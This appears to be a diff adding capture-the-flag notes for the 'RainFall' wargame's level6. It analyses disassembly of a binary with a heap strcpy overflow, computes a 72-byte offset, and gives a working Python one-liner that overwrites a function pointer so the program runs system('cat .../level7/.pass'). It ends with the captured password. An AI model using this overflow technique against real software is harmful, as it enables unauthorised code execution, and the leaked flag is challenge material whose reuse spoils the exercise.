@@ -12,4 +12,55 @@ this algo will apply almost to any binary file to collect info about:
 	info frame, set $<regname>=<value>)
 
 
+   0x08048485 <+9>:	movl   $0x40,(%esp)
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+   0x08048495 <+25>:	movl   $0x4,(%esp)
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+
+this lines tell us that we create 2 buffers on heap with the size 64 and 4
+
+than we need to find out in which buffer happens strcpy
+
+64 bytes buffer: 0x804a008
+4 bytes buffer 0x804a050
+
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+=> 0x080484ca <+78>:	mov    0x18(%esp),%eax
+
+(gdb) p /x $eax
+$12 = 0x804a008
+
+
+soo writing is happening in a first buffer of size 64 that is allocated on a heap 
+
+than it takes from $esp pointer to buffer of size 4 and uses it for call instruction
+
+ 804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
+ 80484a1:       89 44 24 18             mov    %eax,0x18(%esp)
+.....
+ 80484ca:       8b 44 24 18             mov    0x18(%esp),%eax
+ 80484ce:       8b 00                   mov    (%eax),%eax
+ 80484d0:       ff d0                   call   *%eax
+
+the content of the $eax after execution is 0x08048468 which is a start of function <m> which is writing "Nope" to stdout
+
+also in assembly there is a function n which executes system("cat /home/user/level7/.pass")
+lets rewrite content of the buffer size of 4
+
+to do it:
+we have to calculate where we need to put the address of function <n> (0x08048454)
+
+so simple math: 
+lets calculate distance between buffers: 0x804a050 - 0x804a008 = 48 to dec is (72)
+
+so we need to input 72 bytes firstly to get access to the content second heap allocated buffer
+and put address of function <n>
+
+it goes like this: 
+
+./level6 `python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]'`
+
+level6@RainFall:~$ ./level6 `python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
